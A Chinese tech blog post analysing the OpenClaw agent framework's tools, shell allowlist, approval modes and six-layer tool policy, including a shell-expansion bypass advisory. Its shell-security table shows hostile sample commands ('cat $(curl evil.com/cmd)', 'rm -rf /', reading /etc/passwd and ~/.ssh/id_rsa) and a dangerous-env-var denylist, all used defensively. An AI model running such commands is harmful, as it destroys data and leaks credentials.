---
title: "拆解 OpenClaw 架构（五）：4 个工具原语 + 6 层安全策略，一套 Agent 的放权与收权工程"
source: wechat
url: https://mp.weixin.qq.com/s/2ShsYOsEE1oKpjsX9_K8Yw
ingest_date: 2026-07-04
vxc: 64
stars: 4
sha256: b2af12b69836bdb474033255c1efab673c5b84e62335fbf4ffdb0146a7ce32fe
---

# 拆解 OpenClaw 架构（五）：4 个工具原语 + 6 层安全策略，一套 Agent 的放权与收权工程

**来源**: 科技充电站

**发布日期**: 2026-03-02

**原文链接**: https://mp.weixin.qq.com/s/2ShsYOsEE1oKpjsX9_K8Yw

---

AI 时代，有两种行为：

一种，活在别人的评测里，把模型的强当自己的强，痴人说梦；

另一种，活在真实的实战里，用最顶级的 AI，武装自己。

前者在噪音里坐享"技术平权"，后者在 疼痛中完成"自我进化"。

朋友们好，我是行小招。

这是 OpenClaw 深度技术解析系列的第五篇。前四篇我们拆了消息流水线、人格系统、Agent Runner 和记忆系统，今天聊一个更加直觉化的主题：工具链。

上篇结尾我提到，OpenClaw 的核心工具原语只有四个，却撬动了整个 Unix 生态。写这篇之前我花了不少时间在  src/agents/pi-tools.ts  和  src/infra/exec-safety.ts  里翻来覆去地看，越看越觉得这套设计有意思：它同时做了两件看似矛盾的事，一边给 Agent 发了一把几乎万能的钥匙，一边用 6 层策略把这把钥匙能开的门限制得清清楚楚。

放权和收权的平衡艺术，这才是这篇文章的核心。

OpenClaw 的工具层设计可以用一个词概括：克制。

核心工具原语只有四个： Read （读文件）、 Write （写文件）、 Edit （编辑文件）、 Bash （执行 shell 命令）。

就这四个。

你可能会想，这也太简陋了吧？

别的 Agent 框架动辄几十个内置工具，搜索工具、数据库工具、HTTP 工具、文件管理工具、代码执行工具，恨不得把所有能力都包装成专用 API。OpenClaw 呢？一个 Bash 搞定。

你要发 HTTP 请求？  curl  。你要处理 JSON？  jq  。你要搜索文件内容？  grep  。你要查看进程？  ps  。你要操作数据库？  sqlite3  命令行。你要安装依赖？  npm install  。

这不是偷懒，这是一个深思熟虑的架构选择。

成本不对称是根本原因。 链式执行  curl | jq | grep  的 CPU 成本大约 $0.001，而让 LLM 做等价的推理链（理解 API 响应、提取字段、过滤条件）要 $0.15 到 $0.50。100 到 500 倍的成本差距。更关键的是，一旦某个工作流被验证有效、稳定为 shell 脚本，LLM 推理成本就永久降到了零，只剩下 CPU 执行成本。

这跟我以前做系统架构时的一个经验很像：能用基础设施解决的问题，就别在应用层重新发明轮子。Unix 的  pipe  已经被验证了 50 年，几乎所有命令行工具都遵循"文本进、文本出"的约定，这套生态的丰富程度是任何 Agent 框架自建的工具集望尘莫及的。

OpenClaw 选择站在巨人肩上，而不是从头造一个更矮的巨人。

## Semantic Snapshots：浏览器交互的数量级突破

工具层里最有技术独创性的不是 Bash，而是浏览器工具。

传统的 AI 操控浏览器方案是截屏再发给视觉模型：你截一张网页截图，扔给模型说"帮我点登录按钮"，模型看图猜坐标。这个方案又贵又不精确，一张截图动辄 5MB，折算成 token 是天文数字，而且模型经常猜错按钮位置。

OpenClaw 的做法完全不同：不截图，生成"语义快照"。

所谓语义快照，是把页面的 Accessibility Tree（可达性树）转成文本表示：

              - button "Sign In" [ref=1]  
- textbox "Email" [ref=2]  
- link "Forgot password?" [ref=4]  
- heading "Welcome back"

Agent 看到的不是像素，而是语义结构。要点击登录按钮？直接说  click ref=1  。要在邮箱框里输入？  type ref=2  。精确到元素级别，不用猜坐标。

数字对比很直观：语义快照约 50KB ，截图约 5MB ，100 倍的 token 缩减。

这不是渐进改进，是数量级突破。

底层基于 Playwright-on-CDP（Chrome DevTools Protocol），支持多种输出格式：  --format ai  是默认格式，带数字 ref ID，给模型看的；  --format aria  输出原始可达性树，给开发者调试用的；  --interactive  只列出可交互元素（按钮、输入框、链接），过滤掉纯展示内容；  --labels  在截图上叠加 ref 标签，结合视觉和语义。

有一个关键限制需要注意： ref ID 在页面导航后不稳定。 Agent 必须在页面变化后重新获取快照。这意味着每次点击链接、提交表单、页面跳转后，之前的 ref 编号就失效了，Agent 要重新"看"一遍页面。这是一个工程上的权衡，为了保持快照的轻量级，牺牲了跨页面的引用稳定性。

这个模块后来被提取成了独立的 BrowserClaw 库，说明社区认可它的通用价值。在我看来，Semantic Snapshots 可能是 OpenClaw 对整个 AI Agent 生态最重要的技术贡献之一，比它的消息流水线和记忆系统的影响面更广。因为几乎所有需要 AI 操控浏览器的场景都面临同一个痛点：截图太贵，坐标太不精确。

## MCP 集成：标准化的工具扩展

除了四个核心原语和浏览器工具，OpenClaw 还支持 MCP（Model Context Protocol）来扩展工具。

Gateway 作为 MCP Host，与 MCP Server 进程保持 1:1 连接。默认传输方式是 stdio，OpenClaw 把每个 MCP Server 作为子进程启动，通过 stdin/stdout 用 JSON-RPC 2.0 通信。配置很直观：

              {  
  "mcpServers": {  
    "filesystem": {  
      "command": "npx",  
      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/path/to/dir"],  
      "status": "active"  
    }  
  }  
}

这个 stdio 传输的选择跟 Language Server Protocol 的思路一脉相承：子进程 + 标准输入输出，简单、隔离、跨语言。MCP Server 可以用 Python、Go、Rust 写，只要遵循 JSON-RPC 2.0 协议就行。

但安全研究者也标记了几个风险点：环境变量可能泄露凭据给 MCP Server，过度授权的 Server 可能做超出预期的事情，以及工具返回值可能被用来做 prompt 注入。

这些风险在后面的安全模型部分会有对应的防御措施。

## Shell 安全模型：Allowlist + 结构化阻断

说完了"给 Agent 什么能力"，接下来聊"怎么限制这些能力"。

四个核心原语里，前三个（Read、Write、Edit）的风险相对可控，操作对象是文件，可以通过路径白名单限制。真正危险的是第四个： Bash 。

一个能执行任意 shell 命令的工具，放在 AI Agent 手里，你想想这个画面就知道安全压力有多大。理论上 Agent 可以  rm -rf /  ，可以  curl  恶意脚本然后执行，可以读取  ~/.ssh/id_rsa  。

OpenClaw 的防御策略是 Allowlist + 结构化阻断 的纵深防御。

第一层是 Allowlist ，每个命令必须匹配预批准列表中的模式。不在白名单里的命令，直接拒绝。

但白名单本身不够。一个命令可能看起来无害（比如  cat  ），但通过 shell 特性变得危险。所以 OpenClaw 加了第二层： 结构化阻断 。即使命令通过了白名单，系统还会解析 shell 语法结构，阻断四类危险模式：

危险模式
示例
防御目的

重定向 >
cat /etc/passwd > /tmp/leak
防止覆写系统文件

命令替换 $(...)
cat $(curl evil.com/cmd)
阻止嵌套危险命令

子 shell (...)
(rm -rf /)
防止逃逸执行上下文

链式执行 && ||
ls && rm -rf /
阻止多步利用

isSafeExecutableValue()  函数（  src/infra/exec-safety.ts:16-44  ）用严格正则校验可执行文件名：  /^[A-Za-z0-9._+-]+$/  。这意味着文件名里不能有空格、特殊字符、路径分隔符，从源头上杜绝了通过文件名注入的攻击。

环境变量注入也被专门处理了。  DANGEROUS_HOST_ENV_VARS  黑名单覆盖了  LD_PRELOAD  、  DYLD_  、  NODE_OPTIONS  、  PATH  等高危变量。为什么这些变量危险？  LD_PRELOAD  可以让任何进程在启动时加载恶意共享库，  NODE_OPTIONS  可以注入代码到 Node.js 运行时，  PATH  可以让 Agent 执行攻击者控制的同名命令，每一个都是直通系统权限的后门。

这里有一个已知漏洞值得详细讲讲，因为它很有教育意义。

GHSA-xvhf-x56f-2hpp （2026.2.14 修复）：safeBins 列表可以通过 shell 展开绕过 stdin 限制。问题出在哪？允许列表验证的是展开前的 argv token，比如  echo .txt  在验证阶段被拆成  ["echo", ".txt"]  ，  echo  在白名单里、  .txt  看起来无害，验证通过。但实际执行时 OpenClaw 用的是  sh -c  ，shell 会把  .txt  展开成当前目录下所有  .txt  文件的实际路径。

这是一个经典的安全问题： 验证和执行不在同一层。 安全检查看到的是字面值，执行引擎看到的是展开后的值。两者之间的语义差异就是攻击面。

做过 Web 安全的人对这种模式应该不陌生，它本质上跟 SQL 注入是同一类问题：输入在不同处理阶段被赋予了不同的语义。

## 三种执行模式和审批系统

Shell 命令可以在三种模式下运行：

sandbox （Docker 容器，默认），命令在隔离的容器里执行，就算出了问题也不影响宿主机。

gateway （直接在宿主机），命令在 Gateway 所在的机器上直接执行，性能最好但风险最高。

node （远程节点），命令在通过网络连接的远程机器上执行，适合把计算任务分发到专用服务器。

审批系统基于  exec-approvals.json  ，支持按 Agent 配置 pattern 允许列表。安全模式从最严格到最宽松：  security: "deny"  阻断所有命令，  ask: "always"  每条命令都提示用户确认，而  askFallback: "deny"  确保用户不回应时默认拒绝。

这个设计思路跟 sudo 很像：默认不给权限，需要时逐条申请，用户不在场就拒绝。

## 6 层工具策略管线：给 AI 的 IAM 系统

前面讲的 Shell 安全是针对 Bash 这一个工具的防御。但 OpenClaw 的工具不止 Bash，还有浏览器工具、消息发送工具、定时任务工具、Gateway 管理工具等。这些工具的权限管理需要一套更通用的框架。

OpenClaw 设计了一套 6 层工具策略管线 ：

global → provider → agent → group → sandbox → subagent-depth

代码入口在  createOpenClawCodingTools()  （  src/agents/pi-tools.ts  ），构建流程是这样的：

- 1.
   构建基线工具
   ：根据沙箱配置和 workspace-only 文件系统策略，替换 bash/edit/read/write 的具体实现

- 2.
   添加 OpenClaw 专有工具
   ：消息发送、浏览器、Canvas、session 管理、cron 定时、Gateway 管理等

- 3.
   逐层应用策略过滤
   ：从 global policy 开始，一层层叠加 provider policy、agent policy、group/channel policy、sandbox policy、sub-agent depth policy

- 4.
   应用 owner-only 门控
   ：某些敏感工具只有 Agent 的"主人"才能触发

- 5.
   标准化工具 schema
   ：针对不同模型 provider 的特性做适配（Gemini 和 Anthropic 对工具定义的期望格式不同）

deny/allow 规则用 glob 匹配 + tool groups 实现。比如你可以写  deny: ["gateway."]  来禁止所有 Gateway 管理工具，或者  allow: ["exec."]  来允许所有执行类工具。还有特殊情况：  apply_patch  工具从  exec  组继承 allow 规则。

看到这套 6 层策略时，我的第一反应是：这不就是企业级 IAM（身份与访问管理）的思路吗？

global policy 像组织级安全基线，所有人都得遵守； provider policy 像按供应商划分的策略，用 OpenAI 和用 Gemini 的权限不同； agent policy 像个人权限，每个 Agent 有自己的 allow/deny 列表； group/channel policy 像群组权限，不同聊天场景的工具范围不同； sandbox policy 像运行环境隔离； subagent-depth policy 像委托层级限制，子 Agent 的权限比父 Agent 更窄。

区别在于，传统 IAM 的"用户"是人，这里的"用户"是 AI Agent。

## 控制面工具 vs 工作区工具：不是所有工具都平等

6 层策略管线解决的是"谁能用什么工具"的问题。但还有一个更上层的分类需要关注： 哪些工具能改变系统本身？

OpenClaw 有两个内置工具可以做持久的控制面变更：

gateway 工具 ，可以调用  config.apply  （应用配置）、  config.patch  （修改配置）、  update.run  （执行更新）。换句话说，Agent 通过这个工具可以修改 OpenClaw 自身的配置。

cron 工具 ，可以创建定时任务，而且这些任务在原始聊天结束后继续运行。这意味着 Agent 可以设置一个每小时执行一次的任务，即使你关掉了对话窗口，任务依然在后台跑。

安全文档对这两个工具的建议是： 在非受信任面上默认 deny。

这个分类很有洞察力。大多数工具是"在工作区内操作"的，比如读文件、写文件、执行 shell 命令，影响范围局限在当前工作空间里。但 gateway 和 cron 是"改变控制面"的，它们修改的是系统本身的行为，影响范围超出了当前工作空间。

类比一下：普通员工可以在自己的工位上做任何事（工作区工具），但只有管理员才能修改公司的门禁系统和排班计划（控制面工具）。OpenClaw 的安全文档实际上是在建议："别让 Agent 当管理员，除非你完全信任它。"

## Tools、Skills、Plugins 的三层分界

工具链的最后一个话题： 三种扩展机制的关系。

维度
Tools
Skills
Plugins

本质
运行时原语
Markdown 说明书
代码模块（npm 包）

回答的问题
"能做什么"
"怎么做"
"多了什么能力"

加载方式
编译时确定
热重载（250ms）
需要重启

信任边界
受策略管线约束
数据，不执行代码
in-process，共享 Gateway 信任

这个分层很清楚：Tools 提供能力原语，Skills 教 Agent 怎么组合这些原语完成任务，Plugins 往能力池里添加新原语。

Skills 是 Markdown 文件，这一点在第 6 篇会详细展开。这里只提一个关键区别： Skills 不执行代码。 它们只是告诉 Agent"遇到这种场景，用这些工具，按这个步骤做"。真正执行的还是 Tools。这意味着 Skills 的安全风险比 Plugins 低一个数量级，因为恶意 Skill 最多只能误导 Agent 的行为，而恶意 Plugin 可以直接在 Gateway 进程里执行任意代码。

Plugins 是 npm 包，in-process 与 Gateway 共享信任边界。上一篇讲的 memory-core 就是一个插件，它注册 memory_search 和 memory_get 两个工具。插件需要 Gateway 重启才能生效，不支持热重载。

这种分层设计让不同的扩展机制有不同的安全 profile：Tools 受 6 层策略管线的精细控制，Skills 是纯数据不执行代码，Plugins 则需要跟 Gateway 同等级的信任。

## 一些个人观察

写到这里，分享几个更深层的思考。

关于成本不对称的战略意义， $0.001 vs $0.15-0.50 这个数字差距不只是省钱的问题，它意味着 OpenClaw 的 Agent 在使用 shell 工具时几乎没有边际成本压力，可以大胆地"多试几次"。一个  curl  失败了？再来一次，成本忽略不计。但如果每次尝试都要花 $0.15 的 LLM 推理费，Agent 的行为策略就会完全不同，它必须更谨慎，必须"想好了再做"。

低成本工具让 Agent 有了"试错的自由"，这对 Agent 的自主性来说是一个被低估的推动力。

关于 6 层策略的管理复杂度， 6 层策略管线在当前规模下运转良好，但我有一个疑虑：当 Agent 的工具越来越多、部署场景越来越多样化时，6 层叠加的策略会不会变成一个调试噩梦？

做过企业级 IAM 系统的人都知道，多层策略叠加后，"为什么这个用户被拒绝了"这个问题的排查成本会指数级增长。OpenClaw 目前没有看到类似 AWS IAM Policy Simulator 的工具来帮你可视化策略评估过程，当工具数量从十几个增长到上百个的时候，这可能会成为一个运维痛点。

关于 Semantic Snapshots 的行业影响， 我把 Semantic Snapshots 列为 OpenClaw 最重要的技术贡献之一，原因不只是 100 倍的 token 缩减。更重要的是它改变了"AI 怎么理解网页"这个问题的思路。

之前业界的主流方向是让视觉模型变得更强：提高分辨率、优化 OCR、增加空间理解能力。但这个方向的问题是，你永远在追赶网页设计的复杂度，网页可以有无限多种布局、样式、交互模式，视觉模型要"看懂"所有这些组合，难度极高。

Semantic Snapshots 换了一个思路：不看像素，看语义。网页再复杂，Accessibility Tree 里的信息是结构化的，  button  、  textbox  、  link  ，意义明确。这相当于跳过了"视觉理解"这个高成本环节，直接获取了"语义理解"的结果。

关于"验证和执行不在同一层"， GHSA-xvhf-x56f-2hpp 这个漏洞值得每个做安全的人记住。它揭示了一个通用模式：当系统在两个不同层面处理同一份输入时（验证层看字面值，执行层看展开值），它们之间的语义差异就是攻击面。

这个模式在 Web 安全里叫 "impedance mismatch"，在编译器安全里叫 "TOCTOU"（Time of Check, Time of Use），在 shell 安全里就是"展开 vs 字面值"的问题。OpenClaw 的这个案例是一个很好的教学样本。

下一篇，我们聊 Skills 与 ClawHub 生态。OpenClaw 最反直觉的设计之一：Skills 不是代码，是 Markdown 说明书。Tools 提供能力，Skills 教 Agent 怎么用。加上 ClawHub 5700+ 社区 Skills，这创造了一个全新的 Agent 扩展生态，但也引来了供应链安全的新问题。

你在设计 Agent 的工具层时，会选择"少而精的原语 + Unix 生态"还是"多而全的专用工具"？哪种方案在你的场景下更合适？欢迎留言聊聊。

我是行小招，持续探索 AI 在个人生活和企业落地中的应用场景，欢迎一起聊聊，也欢迎你把这篇文章分享给身边做技术、做产品的朋友。

当 90% 的内容都在沦为噪音，真正稀缺的是：深度阅读，独立思考，持续实战。 

 交给 AI 的是任务，留给自己的是思考。 

 脑子不停转，持续定义问题，决定解决什么问题，这才是 AI 时代的底层逻辑。

👇 长按关注，一起用 AI 武装自己
